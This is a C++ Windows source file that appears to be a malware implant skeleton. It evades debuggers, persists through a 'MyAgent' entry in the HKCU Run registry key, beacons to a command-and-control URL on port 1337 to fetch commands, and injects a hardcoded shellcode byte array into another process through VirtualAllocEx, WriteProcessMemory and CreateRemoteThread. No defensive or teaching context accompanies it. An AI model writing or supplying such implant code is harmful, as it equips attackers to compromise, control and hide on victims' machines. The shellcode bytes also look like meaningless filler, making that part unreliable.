#include <windows.h>
#include <wininet.h>
#include <string>
#include <iostream>
#include <vector>

#pragma comment(lib, "wininet.lib")

const std::string url = "http://192.168.1.117:1337";
const std::string userAgent = "Agent/1.0";

void anti_debug() {
    if (IsDebuggerPresent()) {
        ExitProcess(1); // Terminate if debugger is detected
    }
}

void persist() {
    char path[MAX_PATH];
    HKEY hKey;
    if (GetModuleFileName(NULL, path, sizeof(path))) {
        if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            if (RegSetValueEx(hKey, "MyAgent", 0, REG_SZ, (const BYTE*)path, strlen(path) + 1) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
            } else {
                std::cerr << "Failed to set registry value for persistence." << std::endl;
            }
        } else {
            std::cerr << "Failed to open registry key for persistence." << std::endl;
        }
    } else {
        std::cerr << "Failed to get module file name." << std::endl;
    }
}

void communicate() {
    HINTERNET hInternet = InternetOpen(userAgent.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect) {
            char buffer[1024];
            DWORD bytesRead;
            if (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead)) {
                // Handle commands from the server here
                if (bytesRead > 0) {
                    // Process the received data
                }
            } else {
                std::cerr << "Failed to read from URL." << std::endl;
            }
            InternetCloseHandle(hConnect);
        } else {
            std::cerr << "Failed to open URL." << std::endl;
        }
        InternetCloseHandle(hInternet);
    } else {
        std::cerr << "Failed to initialize internet session." << std::endl;
    }
}

void inject_payload(HANDLE process, const std::vector<unsigned char>& payload) {
    SIZE_T size = payload.size();
    LPVOID remoteMemory = VirtualAllocEx(process, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMemory) {
        SIZE_T written;
        if (WriteProcessMemory(process, remoteMemory, payload.data(), size, &written)) {
            HANDLE thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
            if (thread) {
                WaitForSingleObject(thread, INFINITE);
                CloseHandle(thread);
            } else {
                std::cerr << "Failed to create remote thread." << std::endl;
            }
        } else {
            std::cerr << "Failed to write to process memory." << std::endl;
        }
    } else {
        std::cerr << "Failed to allocate memory in remote process." << std::endl;
    }
}

int main() {
    anti_debug();
    persist();
    communicate();

    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234); // Replace 1234 with the actual process ID
    if (process) {
        // Inject a custom payload
        std::vector<unsigned char> payload{
            0x55, 0x48, 0x89, 0xe5, 0x53, 0x48, 0x89, 0x55, 0x08, 0x57, 0x48, 0x89, 0x5d, 0x10,
            0x41, 0x54, 0x48, 0x89, 0x45, 0x0c, 0x41, 0x56, 0x48, 0x89, 0x45, 0x14, 0x41, 0x57,
            0x48, 0x89, 0x45, 0x18, 0x41, 0x5e, 0x48, 0x89, 0x45, 0x1c, 0x4c, 0x89, 0xe1, 0xb8,
            0x01, 0x00, 0x00, 0x00, 0xff, 0xd5
        };
        inject_payload(process, payload);
        CloseHandle(process);
    } else {
        std::cerr << "Failed to open target process." << std::endl;
    }

    return 0;
}

